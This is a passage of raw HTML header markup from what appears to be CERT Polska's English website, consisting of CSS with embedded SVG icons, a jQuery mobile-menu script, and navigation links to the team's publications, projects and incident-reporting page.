IDYuMTA0NjZaTTguOTM3NTQgMy40Mzc1SDMuNDM3NTRDMi43NjI3NiAzLjQzNzUgMi4xODkwNCAzLjU4ODc1IDEuNzExNTcgMy44NTIwNkw4LjkzNzU0IDguMTYyNjlWMy40Mzc1Wk0xLjczMzU3IDE4LjE1ODlDMi4yMDY1NyAxOC40MTQ3IDIuNzcyNzMgMTguNTYyNSAzLjQzNzU0IDE4LjU2MjVIOC45Mzc1NFYxMy44NjE0TDEuNzMzNTcgMTguMTU4OVpNNC4wODIzMmUtMDUgMTMuMDYyNVYxNC43ODEyQzQuMDgyMzJlLTA1IDE1LjE3NjkgMC4wNDE5NzgzIDE1LjU1ODEgMC4xMjQ4MjIgMTUuOTE2N0w0LjkwOTQ4IDEzLjA2MjVINC4wODIzMmUtMDVaTTIwLjMyMDggMy44Njg5MUMxOS44Mzc1IDMuNTk0NTkgMTkuMjUyMSAzLjQzNzUgMTguNTYyNSAzLjQzNzVIMTMuMDYyNVY4LjE5ODc4TDIwLjMyMDggMy44Njg5MVpNMjIgOC45Mzc1VjcuMjE4NzVDMjIgNi44NDI2OSAyMS45NjEyIDYuNDgwMDMgMjEuODg1OSA2LjEzNjk3TDE3LjE5MTcgOC45Mzc1SDIyWiIgZmlsbD0iIzJFMzE5MiIvPgo8cGF0aCBkPSJNMTcuMTkxNiA4LjkzNzVMMjEuODg1OSA2LjEzNjk3QzIxLjY3MDcgNS4xNTI0NyAyMS4xNDY4IDQuMzM3NDQgMjAuMzIwOCAzLjg2ODkxTDEzLjA2MjUgOC4xOTg3OFYzLjQzNzVIMTIuMzc1VjkuNjI1SDIyVjguOTM3NUgxNy4xOTE2Wk0wIDEyLjM3NVYxMy4wNjI1SDQuOTA5NDRMMC4xMjQ3ODEgMTUuOTE2N0MwLjM1MiAxNi44OTgxIDAuODkxNjg4IDE3LjcwMzggMS43MzM1MyAxOC4xNTg5TDguOTM3NSAxMy44NjE0VjE4LjU2MjVIOS42MjVWMTIuMzc1SDBaTTIyIDEyLjM3NUgxMi4zNzVWMTguNTYyNUgxMy4wNjI1VjEzLjgyNTNMMjAuMjk5MSAxOC4xNDI0QzIxLjEzMTMgMTcuNjc5MSAyMS42NjE3IDE2Ljg2ODUgMjEuODgxOCAxNS44ODU0TDE3LjE1MTEgMTMuMDYyNUgyMlYxMi4zNzVaTTguOTM3NSAzLjQzNzVWOC4xNjI2OUwxLjcxMTUzIDMuODUyMDZDMC44NzYyMTkgNC4zMTI2OSAwLjM0MjM3NSA1LjEyMTg4IDAuMTE5OTY5IDYuMTA0NjZMNC44Njg4OCA4LjkzNzVIMFY5LjYyNUg5LjYyNVYzLjQzNzVIOC45Mzc1WiIgZmlsbD0iI0U2RTdFOCIvPgo8cGF0aCBkPSJNMTIuMzc1IDkuNjI1VjMuNDM3NUg5LjYyNVY5LjYyNUgwVjEyLjM3NUg5LjYyNVYxOC41NjI1SDEyLjM3NVYxMi4zNzVIMjJWOS42MjVIMTIuMzc1WiIgZmlsbD0iI0JFMUUyRCIvPgo8cGF0aCBkPSJNNy41NDA4IDguOTM3ODZMMC42NDg2MDkgNC44MjM1MkMwLjUwMDQ1MyA1LjA0MzUyIDAuMzgxNTE2IDUuMjg1NTIgMC4yODMyMDMgNS41NDMzM0w1Ljk3MTIzIDguOTM3ODZINy41Mzk3N00yMS42ODY4IDE2LjUzMTNMMTUuOTA3MyAxMy4wNjI5SDE0LjMwNjhMMjEuMjg5NCAxNy4yNjMxQzIxLjQ1MTMgMTcuMDM2OSAyMS41ODQ4IDE2Ljc5MTUgMjEuNjg2OCAxNi41MzI3TTIwLjg3MTggNC4yNTk3N0wxMy4wNTE1IDguOTM3ODZMMTQuNjM5MiA4LjkzODg5TDIxLjM4NzQgNC44OTg4QzIxLjIzNjggNC42MjQ4MyAyMS4wNzggNC40NDgxNCAyMC44NzE4IDQuMjU5NzdaTTAuNjIyODI4IDE3LjE0NDlDMC43Nzc0NTggMTcuMzgwNCAwLjk2MzU0NCAxNy41OTM3IDEuMTc1OTIgMTcuNzc4OEw4Ljk1ODc3IDEzLjA2MjlINy4zOTAyM0wwLjYyMjgyOCAxNy4xNDQ5WiIgZmlsbD0iI0JFMUUyRCIvPgo8L2c+CjxkZWZzPgo8Y2xpcFBhdGggaWQ9ImNsaXAwXzc4MV8xMDkzNSI+CjxyZWN0IHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K");
    }
    
    .mobile-header .menu-bar .search {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMjM0NyIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTIzNDcpIj4KPHBhdGggZD0iTTIzLjczMTUgMjUuMzMzN0wxNy4yNzE5IDE4Ljg4MjlDMTYuNzYzMyAxOS4yNzIzIDE2LjE3ODMgMTkuNTg1NSAxNS41MTcxIDE5LjgyMjVDMTQuODU1OSAyMC4wNTk2IDE0LjE1MjMgMjAuMTc4MSAxMy40MDYzIDIwLjE3ODFDMTEuNTI0NCAyMC4xNzgxIDkuOTMwNjkgMTkuNTIxOCA4LjYyNTIxIDE4LjIwOTNDNy4zMTk3MyAxNi44OTc1IDYuNjY2OTkgMTUuMzAxOSA2LjY2Njk5IDEzLjQyMjVDNi42NjY5OSAxMS41NDMyIDcuMzE5NzMgOS45NDcyNSA4LjYyNTIxIDguNjM0NzRDOS45MzA2OSA3LjMyMjkxIDExLjUyNDQgNi42NjY5OSAxMy40MDYzIDYuNjY2OTlDMTUuMjg4MiA2LjY2Njk5IDE2Ljg4NjQgNy4zMjI5MSAxOC4yMDA3IDguNjM0NzRDMTkuNTE0MyA5Ljk0NzI1IDIwLjE3MTEgMTEuNTQzMiAyMC4xNzExIDEzLjQyMjVDMjAuMTcxMSAxNC4xNjc1IDIwLjA1NjggMTQuODcwMiAxOS44MjgzIDE1LjUzMDVDMTkuNTk5IDE2LjE5MDggMTkuMjg5NSAxNi43NjY1IDE4Ljg5OTUgMTcuMjU3NUwyNS4zMzM3IDIzLjcwODNMMjMuNzMxNSAyNS4zMzM3Wk0xMy40MDYzIDE3Ljg0MTZDMTQuNjQ0IDE3Ljg0MTYgMTUuNjk1MSAxNy40MTM5IDE2LjU1OTggMTYuNTU4NUMxNy40MjQ1IDE1LjcwMzkgMTcuODU2OCAxNC42NTg1IDE3Ljg1NjggMTMuNDIyNUMxNy44NTY4IDEyLjE4NjYgMTcuNDI0NSAxMS4xNDA5IDE2LjU1OTggMTAuMjg1NUMxNS42OTUxIDkuNDMwODQgMTQuNjQ0IDkuMDAzNSAxMy40MDYzIDkuMDAzNUMxMi4xNjg3IDkuMDAzNSAxMS4xMjE5IDkuNDMwODQgMTAuMjY2IDEwLjI4NTVDOS40MDk1MiAxMS4xNDA5IDguOTgxMjUgMTIuMTg2NiA4Ljk4MTI1IDEzLjQyMjVDOC45ODEyNSAxNC42NTg1IDkuNDA5NTIgMTUuNzAzOSAxMC4yNjYgMTYuNTU4NUMxMS4xMjE5IDE3LjQxMzkgMTIuMTY4NyAxNy44NDE2IDEzLjQwNjMgMTcuODQxNloiIGZpbGw9IiNGQ0ZERkQiLz4KPC9nPgo8L3N2Zz4K");
        height: 50px;
        width: 50px;
        background-repeat: no-repeat;
        background-position: center;
        display: inline-block;
        margin-left: 20px;
    }
    
    .mobile-header .menu-bar .burger {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMzI0OSIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTMyNDkpIj4KPHBhdGggZD0iTTEyLjAwMDMgMjRWMjEuMDc2M0gyNS4zMzQyVjI0SDEyLjAwMDNaTTYuNjY2OTkgMTcuMzMzM1YxNC42NjY3TDI1LjMzNDIgMTQuNTIyMVYxNy40Nzc5TDYuNjY2OTkgMTcuMzMzM1pNOS4zMzQyMSAxMC45MjM3VjhIMjUuMzM0MlYxMC45MjM3SDkuMzM0MjFaIiBmaWxsPSIjRkNGREZEIi8+CjwvZz4KPC9zdmc+Cg==");
        width: 50px;
        height: 50px;
        background-repeat: no-repeat;
        background-position: center;
        margin-left: 20px;
    }
    
    .mobile-header .menu-bar .burger.active {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMzQzNCIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIj4KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTM0MzQpIj4KPHBhdGggZD0iTTIxLjY1NjYgMjMuODI1M0wxNS45OTk3IDE4LjE2ODVMMTAuMzQyOSAyMy44MjUzTDguMTc0NDMgMjEuNjU2OUwxMy44MzEzIDE2TDguMTc0NDMgMTAuMzQzMUwxMC4zNDI5IDguMTc0NjlMMTUuOTk5NyAxMy44MzE1TDIxLjY1NjYgOC4xNzQ2OUwyMy44MjUxIDEwLjM0MzFMMTguMTY4MiAxNkwyMy44MjUxIDIxLjY1NjlMMjEuNjU2NiAyMy44MjUzWiIgZmlsbD0iI0ZDRkRGRCIvPgo8L2c+Cjwvc3ZnPgo=");
    }

    .mobile-header .menu-bar .return {
        display: none;
        align-items: center;
    }

    .mobile-header .menu-bar .return i {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMzQ2NyIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIj4KPHJlY3QgeD0iMzIiIHk9IjMyIiB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHRyYW5zZm9ybT0icm90YXRlKC0xODAgMzIgMzIpIiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTM0NjcpIj4KPHBhdGggZD0iTTE5LjQ2NjMgNy43MzMyN0wyMS41OTk2IDkuODY2NkwxNS40NjYzIDE1Ljk5OTlMMjEuNTk5NiAyMi4xMzMzTDE5LjQ2NjMgMjQuMjY2NkwxMS4xOTk2IDE1Ljk5OTlMMTkuNDY2MyA3LjczMzI3WiIgZmlsbD0iI0ZDRkRGRCIvPgo8L2c+Cjwvc3ZnPgo=");
        width: 32px;
        height: 32px;
    }

    .mobile-header .menu-overlay {
        position: absolute;
        width: 100%;
        background-color: #121F29;
        display: none;
    }

    .mobile-header .menu-overlay .menu-container {
        width: 100%;
        height: 100%;
        overflow-x: hidden;
        position: relative;
        padding: 20px;
    }

    .mobile-header .menu-overlay .menu-container ul,
    .mobile-header .menu-overlay .menu-container li {
        margin: 0;
        padding: 0;
    }
    
    .mobile-header .menu-overlay .menu-container li:not(.menu-header) {
        padding: 10px 0;
        font-weight: bold;
        font-size: 1.3rem;
        cursor: pointer;
    }
    
    .mobile-header .menu-overlay .menu-container .menu-root > li:not(.menu-header) {
        font-size: 2rem;
    }

    .mobile-header .menu-overlay .menu-container ul {
        list-style: none;
    }

    .mobile-header .menu-overlay .menu-container ul {
        display: block;
        width: 100%;
    }

    .mobile-header .menu-overlay .menu-container li > ul {
        position: absolute;
        top: 0;
        left: 100vw;
        float: left;
    }

    .mobile-header .menu-overlay .menu-container .menu-root {
        position: relative;
        transition: transform 0.2s ease-out;
    }

    .mobile-header .menu-overlay .menu-container ul:not(.menu-active) {
        display: none;
    }
    
    .mobile-header .menu-button {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgiIGhlaWdodD0iMjgiIHZpZXdCb3g9IjAgMCAyOCAyOCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPG1hc2sgaWQ9Im1hc2swXzY1NF8xMzIzMyIgc3R5bGU9Im1hc2stdHlwZTphbHBoYSIgbWFza1VuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeD0iMCIgeT0iMCIgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4Ij4KPHJlY3Qgd2lkdGg9IjI4IiBoZWlnaHQ9IjI4IiBmaWxsPSIjRDlEOUQ5Ii8+CjwvbWFzaz4KPGcgbWFzaz0idXJsKCNtYXNrMF82NTRfMTMyMzMpIj4KPHBhdGggZD0iTTEwLjk2NjMgMjEuMjMzM0w5LjA5OTYxIDE5LjM2NjZMMTQuNDY2MyAxMy45OTk5TDkuMDk5NjEgOC42MzMyN0wxMC45NjYzIDYuNzY2NkwxOC4xOTk2IDEzLjk5OTlMMTAuOTY2MyAyMS4yMzMzWiIgZmlsbD0iI0ZDRkRGRCIvPgo8L2c+Cjwvc3ZnPgo=");
        background-repeat: no-repeat;
        background-position: right center;
        background-size: 2.5rem;
    }
    
    .mobile-header .menu-header {
        color: #858889;
        font-size: 1.2rem;
        padding-top: 1.5rem !important;
        padding-bottom: 0.3rem !important;
    }
    
    .mobile-header .menu-container a {
        display: block;
        width: 100%;
        color: #FCFDFD;
    }
</style>

<script>
    $(function() {
        let $mobile_header = $('.mobile-header');
        let $burger = $('.mobile-header .burger');
        let $menu_overlay = $('.mobile-header .menu-overlay');
        let $return = $('.mobile-header .return');

        let active = false;
        let level = 0;
        let $menu_root = $('.mobile-header .menu-root');

        let overlay_height = window.innerHeight - $('.mobile-header .top')[0].scrollHeight
            - $('.mobile-header .menu-bar')[0].scrollHeight;
        $('.mobile-header .menu-overlay').css({'height': overlay_height});

        $burger.on('click', function() {
            if (active) {
                active = false;
                $menu_overlay.fadeOut(200);
                $return.css({'opacity': 0});
                $mobile_header.css({'background-color': '#212E3B'});
                $burger.removeClass('active');
                $('body').css({'overflow': 'inherit'});
            } else {
                active = true;
                $menu_overlay.fadeIn(200);
                $return.css({'opacity': 1});
                $mobile_header.css({'background-color': '#121F29'});
                $burger.addClass('active');
                $('body').css({'overflow': 'hidden'});
            }
        });
        
        $return.on('click', function () {
            if (level < 1) return;

            $menu_root.find('> li > ul '.repeat(level)).removeClass('menu-active');
            level -= 1;
            $menu_root.css({'transform': 'translateX(' + (-level * 100) + 'vw)'});
            
            if (level === 0) {
                $return.css({'display': 'none'});
            }
        });
    
        $menu_root.on('click', function (event) {
            let $target = $(event.target);
            if ($target.hasClass('menu-button')) {
                level += 1;
                $menu_root.find('> li > ul '.repeat(level)).removeClass('menu-active');
                $target.children('ul').first().addClass('menu-active');
                $menu_root.css({'transform': 'translateX(' + (-level * 100) + 'vw)'});
                $return.css({'display': 'flex'});
            }
        });
        
        let last_scroll = window.scrollY, top = 0, max = $mobile_header.outerHeight();
        $(window).on('scroll', function() {
            top += last_scroll - window.scrollY;

            if (top < -max) top = -max;
            if (top > 0) top = 0;

            $mobile_header.css({'top': top + 'px'});
            last_scroll = window.scrollY;
        });
    });
</script>

<header class="mobile-header">
    <div class="top">
        <a href="/en/" class="logo"></a>

            <a href="https://incydent.cert.pl/#!/lang=en" class="cta primary report-incident">Report an incident</a>
    </div>
    <div class="menu-bar">
        <div class="return"><i></i>Back</div>
        
    
        <a href="../../../../../posts/2024/10/analiza-joker/" class="language pl"></a>
        <a href="/en/search" class="search"></a>
        <div class="burger"></div>
    </div>
    <div class="menu-overlay">
        <div class="menu-container">
            <ul class="menu-root menu-active">
                <li class="menu-header">You're in the menu</li>
                <li class="menu-button">About us
                    <ul>
                        <li class="menu-header">About us</li>
                        <li><a href="../../../../about-us/">About our team</a></li>
                        <li><a href="../../../../contact/">Contact</a></li>
                    </ul>
                </li>
                <li><a href="../../../../news/">News</a></li>
                <li class="menu-button">For experts
                    <ul>
                        <li class="menu-header">For experts</li>
                        <li><a href="../../../../news/">News</a></li>
                        <li><a href="../../../../publications/">Publications</a></li>
                        <li><a href="../../../../warning-list/">The Warning List</a></li>
                        
                        <li class="menu-header">Projects</li>
                        <li><a href="../../../../n6/">n6</a></li>
                        <li><a href="/en/posts/2024/01/artemis-security-scanner/">Artemis</a></li>
                        <li><a href="https://mwdb.cert.pl/">MWDB</a></li>
                    
                        <li class="menu-header">CVD program</li>
                        <li><a href="../../../../cvd">CVD policy</a></li>
                        <li><a href="../../../../cve">Advisories</a></li>
                    </ul>
                </li>
            </ul>
        </div>
    </div>
</header><style>
    .desktop-header {
        width: 100%;
        background-color: #212E3B;
        color: #FCFDFD;
        z-index: 99999999;
        transition: background-color 0.2s ease-out;
    }
    
    .desktop-header.active {
        background-color: #121F29;
    }
    
    .desktop-header .top {
        display: flex;
        align-items: center;
        max-width: 1110px;
        margin: 0 auto;
    }
    
    .desktop-header .logo {
        background-image: url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTczIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTczIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTA5LjMyOCAzOS40NTczSDExMy42MTdMMTE3LjQxIDQ0LjU4MDNMMTE3LjQ2MiA0NC41NTQ5VjM5LjQ1NzNIMTIwLjAzM1Y0Ni4zMTU0SDExNS45MjVMMTEyLjA4IDQxLjA3ODRIMTEyLjA0MVY0Ni4zMTU0SDEwOS4zMjJWMzkuNDU3M0gxMDkuMzI4Wk0xMjQuNDE4IDM5LjQ1NzNIMTI4LjA3TDEzMi4zNDYgNDYuMzE1NEgxMjguOTY0TDEyOC4yNDQgNDUuMDA0NkgxMjMuODc4TDEyMy4xNTggNDYuMzE1NEgxMjAuMTNMMTI0LjQxOCAzOS40NTczWk0xMjcuNTI0IDQzLjY2ODRMMTI2LjEyOSA0MC44MTg4SDEyNi4wODRMMTI0LjY1IDQzLjY2ODRIMTI3LjUzSDEyNy41MjRaTTEzMS4zOTQgNDQuMTgxM0gxMzQuNDIzQzEzNC40MjMgNDQuNDM0NiAxMzQuNTE5IDQ0LjYzNzMgMTM0Ljc4OSA0NC44Mzk5QzEzNS4wMDggNDUuMDEwOSAxMzUuNDEzIDQ1LjEyNDkgMTM2LjAwNCA0NS4xNTAyQzEzNi41NTEgNDUuMTUwMiAxMzYuOTU2IDQ1LjA5MzIgMTM3LjI2NSA0NC45NTM5QzEzNy41OCA0NC44Mzk5IDEzNy43NjYgNDQuNjY4OSAxMzcuNzY2IDQ0LjQ3MjZDMTM3Ljc2NiA0NC4zMjcgMTM3LjY4MyA0NC4xODc3IDEzNy41NDggNDQuMTA1M0MxMzcuNDEyIDQzLjk5MTQgMTM3LjIzMiA0My45MDkgMTM3LjAwNyA0My44NTJDMTM2LjgxNSA0My43OTUxIDEzNi41NTcgNDMuNzM4MSAxMzYuMzI2IDQzLjcwNjRDMTM2LjA1NiA0My42NDk0IDEzNS44MjQgNDMuNjI0MSAxMzUuNjA2IDQzLjU5MjRDMTM0Ljc1MSA0My40NTMxIDEzNC4wMjQgNDMuMzMyOCAxMzMuNDg0IDQzLjE5MzVDMTMyLjk4MyA0My4wNzk1IDEzMi41MzIgNDIuODgzMiAxMzIuMTM0IDQyLjYyMzVDMTMxLjc2NyA0Mi4zMzg2IDEzMS41ODcgNDEuOTk2NiAxMzEuNTg3IDQxLjU0MDdDMTMxLjU4NyA0MS4wMjc4IDEzMS43NjcgNDAuNjI4OCAxMzIuMTcyIDQwLjMxODVDMTMyLjU3NyA0MC4wMDE5IDEzMy4xMjQgMzkuNzQ4NiAxMzMuODM4IDM5LjYwM0MxMzQuNTE5IDM5LjQ2MzcgMTM1LjMyOSAzOS4zNzUgMTM2LjIzNiAzOS4zNzVDMTM3LjY4MyAzOS4zNzUgMTM4LjgwOCAzOS41NzEzIDEzOS40ODMgMzkuOTEzM0MxNDAuMjA5IDQwLjI1NTIgMTQwLjU2MyA0MC43NDI4IDE0MC41NjMgNDEuMzM4MVY0MS41NDA3SDEzNy41NDhDMTM3LjU0OCA0MS4yODExIDEzNy40NTEgNDEuMDg0OCAxMzcuMTgxIDQwLjk0NTVDMTM2LjkxMSA0MC43NzQ1IDEzNi41NTcgNDAuNzE3NSAxMzYuMTAxIDQwLjcxNzVDMTM1LjY5NiA0MC43MTc1IDEzNS4zODEgNDAuNzc0NSAxMzUuMTQ5IDQwLjkyMDFDMTM0Ljg3OSA0MS4wMzQxIDEzNC43NDQgNDEuMjA1MSAxMzQuNzQ0IDQxLjM3NjFDMTM0Ljc0NCA0MS43MTggMTM1LjMyOSA0MS45NzEzIDEzNi41NTcgNDIuMTQyM0MxMzcuMzY3IDQyLjI1NjMgMTM3Ljk1MyA0Mi4zMzg2IDEzOC4zNTggNDIuNDAxOUMxMzguNzYzIDQyLjQ4NDIgMTM5LjE2OCA0Mi41NzI5IDEzOS41NzMgNDIuNzEyMkMxMzkuOTkxIDQyLjg1MTUgMTQwLjMwNiA0My4wNTQyIDE0MC41NjMgNDMuMzA3NUMxNDAuNzk0IDQzLjUzNTQgMTQwLjkyOSA0My44Nzc0IDE0MC45NzQgNDQuMjQ0N0MxNDAuOTc0IDQ0Ljc1NzYgMTQwLjc0OSA0NS4xNTY1IDE0MC4zMzggNDUuNDk4NUMxMzkuODg4IDQ1Ljg0MDQgMTM5LjMwOSA0Ni4wNjg0IDEzOC41NzYgNDYuMjM5NEMxMzcuODYzIDQ2LjM3ODcgMTM3LjA0NiA0Ni40NTQ3IDEzNi4xODQgNDYuNDU0N0MxMzUuMTA0IDQ2LjQ1NDcgMTM0LjE5OCA0Ni4zNzg3IDEzMy41MjMgNDYuMjM5NEMxMzIuODQxIDQ2LjA2ODQgMTMyLjMwMSA0NS44MTUxIDEzMS45NDEgNDUuNDczMkMxMzEuNTc0IDQ1LjEzMTIgMTMxLjM5NCA0NC43MDY5IDEzMS4zOTQgNDQuMTk0TTE0MS4zMDIgMzkuNDdIMTQ0LjMxOFY0Mi40ODQySDE0NC4zNjlMMTQ3Ljc5NiAzOS40N0gxNTEuMjc1TDE0Ny41NzggNDIuNDg0MkwxNTEuNTk2IDQ2LjMyOEgxNDcuODg2TDE0NC4zNjkgNDIuNjgwNUgxNDQuMzE4VjQ2LjMyOEgxNDEuMzAyVjM5LjQ3WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTEyOC41NTkgMTQuMzgwOEMxMjguNDA1IDE0LjIyODggMTI4LjE0NyAxMy45ODE5IDEyOCAxMy44Mjk5TDEyNy42MiAxMy40NTYzQzEyNy40NjYgMTMuMzA0MyAxMjcuMjE1IDEzLjMwNDMgMTI3LjA2MSAxMy40NTYzTDEyNS43MzYgMTQuNzYwOEMxMjUuNTgyIDE0LjkxMjcgMTI1LjU4MiAxNS4xNjYgMTI1LjczNiAxNS4zMThMMTI2LjExNiAxNS42OTE2QzEyNi4yNyAxNS44NDM2IDEyNi41MjcgMTYuMDk2OSAxMjYuNjgxIDE2LjI0ODlMMTMzLjM4MSAyMi44NDczQzEzMy41MzUgMjIuOTk5MyAxMzMuNTM1IDIzLjI0NjIgMTMzLjM4MSAyMy4zOTgyTDEyNi42ODEgMjkuOTk2NkMxMjYuNTI3IDMwLjE0ODYgMTI2LjI3NiAzMC4zOTU2IDEyNi4xMTYgMzAuNTUzOUwxMjUuNzM2IDMwLjkyNzVDMTI1LjU4MiAzMS4wNzk1IDEyNS41ODIgMzEuMzI2NSAxMjUuNzM2IDMxLjQ3ODRMMTI3LjA2MSAzMi43ODI5QzEyNy4yMTUgMzIuOTM0OSAxMjcuNDY2IDMyLjkzNDkgMTI3LjYyIDMyLjc4MjlMMTI4IDMyLjQwOTNDMTI4LjE1NCAzMi4yNTczIDEyOC40MTEgMzIuMDEwNCAxMjguNTU5IDMxLjg1ODRMMTM2LjIwNCAyNC4zMjkxQzEzNi4zNTggMjQuMTc3MSAxMzYuNDg3IDIzLjg3MzIgMTM2LjQ4NyAyMy42NTc5VjIyLjU4MTNDMTM2LjQ4NyAyMi4zNjYgMTM2LjM1OCAyMi4wNjIxIDEzNi4yMDQgMjEuOTEwMUwxMjguNTU5IDE0LjM4MDhaIiBmaWxsPSIjMjhBNzQ1Ii8+CjxwYXRoIGQ9Ik0xNTEuMTkxIDI5Ljg4MjhIMTM3LjcyN0MxMzcuNTA5IDI5Ljg4MjggMTM3LjMyOSAzMC4wNjAxIDEzNy4zMjkgMzAuMjc1NFYzMi4xMTgyQzEzNy4zMjkgMzIuMzMzNSAxMzcuNTA5IDMyLjUxMDggMTM3LjcyNyAzMi41MTA4SDE1MS4xOTFDMTUxLjQxIDMyLjUxMDggMTUxLjU5IDMyLjMzMzUgMTUxLjU5IDMyLjExODJWMzAuMjc1NEMxNTEuNTkgMzAuMDYwMSAxNTEuNDEgMjkuODgyOCAxNTEuMTkxIDI5Ljg4MjhaIiBmaWxsPSIjMjhBNzQ1Ii8+CjxwYXRoIGQ9Ik0zNS45Mjg0IDEzLjcxNThIMzAuOTc3N0MzMC43NTkxIDEzLjcxNTggMzAuNDExOSAxMy43ODU1IDMwLjIxMjUgMTMuODY3OEwzMC4wMDA0IDEzLjk1MDFDMjkuNzk0NiAxNC4wMzI0IDI5LjUwNTMgMTQuMjIyNCAyOS4zNTEgMTQuMzc0NEwyMS43MDYyIDIxLjkwMzdDMjEuNTUxOSAyMi4wNTU3IDIxLjQyMzMgMjIuMzU5NiAyMS40MjMzIDIyLjU3NDlWMjMuNjUxNEMyMS40MjMzIDIzLjg2NjcgMjEuNTUxOSAyNC4xNzA3IDIxLjcwNjIgMjQuMzIyN0wyOS4zNTEgMzEuODUyQzI5LjUwNTMgMzIuMDAzOSAyOS43OTQ2IDMyLjE5MzkgMzAuMDAwNCAzMi4yNzYyTDMwLjIxMjUgMzIuMzU4NkMzMC40MTE5IDMyLjQ0MDkgMzAuNzU5MSAzMi41MTA1IDMwLjk3NzcgMzIuNTEwNUgzNS45Mjg0QzM2LjE0NyAzMi41MTA1IDM2LjMyNyAzMi4zMzMyIDM2LjMyNyAzMi4xMTc5VjMwLjI3NTJDMzYuMzI3IDMwLjA1OTkgMzYuMTQ3IDI5Ljg4MjYgMzUuOTI4NCAyOS44ODI2SDMxLjUzMDZDMzEuMzEyIDI5Ljg4MjYgMzEuMDAzNCAyOS43NTU5IDMwLjg0OTEgMjkuNjAzOUwyNC41NDE3IDIzLjM5MThDMjQuMzg3NCAyMy4yMzk4IDI0LjM4NzQgMjIuOTkyOSAyNC41NDE3IDIyLjgzNDZMMzAuODQ5MSAxNi42MjI0QzMxLjAwMzQgMTYuNDcwNCAzMS4zMTIgMTYuMzQzOCAzMS41MzA2IDE2LjM0MzhIMzUuOTI4NEMzNi4xNDcgMTYuMzQzOCAzNi4zMjcgMTYuMTY2NSAzNi4zMjcgMTUuOTUxMlYxNC4xMDg0QzM2LjMyNyAxMy44OTMxIDM2LjE0NyAxMy43MTU4IDM1LjkyODQgMTMuNzE1OFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik01Mi40MjAyIDEzLjcxNThINDEuNTI4NUM0MS4zMDk5IDEzLjcxNTggNDEuMDAxMyAxMy44NDI1IDQwLjg1MzQgMTMuOTk0NEw0MC4wODgzIDE0Ljc1NDNDMzkuOTM0IDE0LjkwNjMgMzkuODA1NCAxNS4yMTAzIDM5LjgwNTQgMTUuNDI1NlYyMS40MTYxQzM5LjgwNTQgMjEuNjMxNCAzOS44MDU0IDIxLjgwODcgMzkuODA1NCAyMS44MDg3VjI0LjAzNzdDMzkuODA1NCAyNC4yNTMgMzkuODA1NCAyNC40MzAzIDM5LjgwNTQgMjQuNDMwM1YzMC44MTM0QzM5LjgwNTQgMzEuMDI4NyAzOS45MzQgMzEuMzMyNyA0MC4wODE5IDMxLjQ4NDdMNDAuODUzNCAzMi4yNDQ2QzQxLjAwNzcgMzIuMz